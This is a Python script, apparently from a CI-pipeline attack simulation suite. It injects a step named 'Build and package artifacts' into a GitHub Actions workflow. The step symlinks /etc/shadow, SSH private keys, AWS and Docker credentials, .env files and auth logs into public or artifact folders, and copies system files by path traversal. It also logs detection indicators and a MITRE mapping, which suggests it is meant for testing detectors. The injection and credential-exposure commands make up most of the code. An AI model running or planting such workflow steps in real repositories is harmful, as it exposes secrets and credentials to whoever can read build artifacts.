#!/usr/bin/env python3
"""Attack Scenario 9.3: Symlink Attack / Path Traversal - File System Attack"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class SymlinkAttack:
    """Symlinks to sensitive files, path traversal in artifacts, escapes workspace boundaries."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject symlink attack into workflow."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create symlink attack step
        malicious_step = '''
      # RESEARCH ATTACK 9.3: Symlink Attack / Path Traversal
      - name: Build and package artifacts
        run: |
          echo "=== Building artifacts ==="
          mkdir -p ./build/artifacts || true
          mkdir -p ./public || true

          # ATTACK 1: Symlink to /etc/passwd
          echo "[ATTACK] Creating symlink to /etc/passwd..."
          ln -s /etc/passwd ./public/users.txt 2>/dev/null || true
          ln -s /etc/shadow ./public/shadow.txt 2>/dev/null || true

          # ATTACK 2: Symlink to SSH keys
          echo "[ATTACK] Creating symlink to SSH keys..."
          ln -s ~/.ssh/id_rsa ./build/artifacts/key 2>/dev/null || true
          ln -s ~/.ssh/id_rsa.pub ./build/artifacts/key.pub 2>/dev/null || true
          ln -s ~/.ssh/known_hosts ./build/artifacts/known_hosts 2>/dev/null || true

          # ATTACK 3: Symlink to environment files
          echo "[ATTACK] Creating symlinks to config files..."
          ln -s ../.env ./public/env-backup.txt 2>/dev/null || true
          ln -s ~/.aws/credentials ./build/artifacts/aws-creds 2>/dev/null || true
          ln -s ~/.docker/config.json ./build/artifacts/docker-config 2>/dev/null || true

          # ATTACK 4: Path traversal in file copies
          echo "[ATTACK] Using path traversal to copy sensitive files..."
          cp ../../../etc/hosts ./build/hosts.txt 2>/dev/null || true
          cp ../../../etc/resolv.conf ./build/resolv.txt 2>/dev/null || true

          # ATTACK 5: Symlink to system logs
          echo "[ATTACK] Symlinking system logs..."
          ln -s /var/log/auth.log ./public/auth.log 2>/dev/null || true
          ln -s /var/log/syslog ./public/syslog 2>/dev/null || true

          # ATTACK 6: Escape workspace boundaries
          echo "[ATTACK] Attempting to escape workspace..."
          # Try to access files outside workspace
          cat ../../../../etc/hostname > ./build/hostname.txt 2>/dev/null || true

          # ATTACK 7: Create malicious archive with path traversal
          echo "[ATTACK] Creating malicious tarball with path traversal..."
          # Tar with absolute paths (dangerous when extracted)
          tar -czf malicious-archive.tar.gz -C / etc/passwd 2>/dev/null || true

          # Log attack indicators
          echo "ATTACK_INDICATOR: symlink_attack=true"
          echo "ATTACK_INDICATOR: path_traversal=true"
          echo "ATTACK_INDICATOR: workspace_escape=true"
          echo "ATTACK_INDICATOR: sensitive_file_access=true"

          # List created symlinks (for verification)
          echo "[ATTACK] Created symlinks:"
          find ./public -type l 2>/dev/null || true
          find ./build/artifacts -type l 2>/dev/null || true

          echo "[ATTACK] Symlink attack complete"
'''

        # Find insertion point (after build or before artifact upload)
        if "- name: Build" in content:
            parts = content.split("- name: Build", 1)
            remaining = parts[1]
            next_step_idx = remaining.find("\n      - name:")
            if next_step_idx != -1:
                content = (parts[0] + "- name: Build" +
                          remaining[:next_step_idx] + malicious_step +
                          remaining[next_step_idx:])
        elif "uses: actions/upload-artifact@" in content:
            # Insert before artifact upload
            parts = content.split("uses: actions/upload-artifact@", 1)
            content = parts[0] + malicious_step + "\n      - uses: actions/upload-artifact@" + parts[1]

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected symlink attack into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "symlink_path_traversal",
            "scenario_id": "9.3",
            "timestamp": datetime.now().isoformat(),
            "severity": "medium",
            "indicators": {
                "symlink_attack": True,
                "path_traversal": True,
                "workspace_escape": True,
                "sensitive_file_access": True,
                "workflow_modified": True,
                "targeted_files": [
                    "/etc/passwd",
                    "/etc/shadow",
                    "~/.ssh/id_rsa",
                    "~/.ssh/id_rsa.pub",
                    ".env",
                    "~/.aws/credentials",
                    "~/.docker/config.json",
                    "/var/log/auth.log",
                    "/var/log/syslog"
                ],
                "techniques": [
                    "symbolic_links",
                    "path_traversal_with_dots",
                    "absolute_paths_in_tar",
                    "workspace_boundary_escape"
                ]
            },
            "expected_detection": {
                "difficulty": "medium",
                "primary_signals": [
                    "symlink_creation",
                    "path_traversal_patterns",
                    "sensitive_file_access",
                    "workspace_boundary_violation",
                    "ln_command_usage",
                    "dot_dot_slash_patterns",
                    "absolute_path_access"
                ],
                "detection_tools": [
                    "Symlink detection",
                    "Path validation",
                    "Workspace boundary checks",
                    "File access monitoring",
                    "Container security",
                    "Artifact scanning"
                ]
            },
            "mitre_attack": {
                "technique": "T1005",
                "name": "Data from Local System",
                "tactic": "Collection",
                "related": "T1083 - File and Directory Discovery"
            },
            "real_world_frequency": "medium",
            "impact": {
                "sensitive_data_exposure": "high",
                "credential_theft": "high",
                "information_disclosure": "high",
                "system_file_exposure": "medium"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"symlink_attack_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 9.3: Symlink Attack / Path Traversal")
        print("=" * 80)
        print("Severity: MEDIUM-HIGH")
        print("Realism: 8/10 - Classic file system attack")
        print("Impact: Sensitive data exposure, credential theft")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Symlinks to sensitive files will be created")
            print("[!] Detection: Symlink detection, path validation, file monitoring")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if SymlinkAttack().execute() else 1)
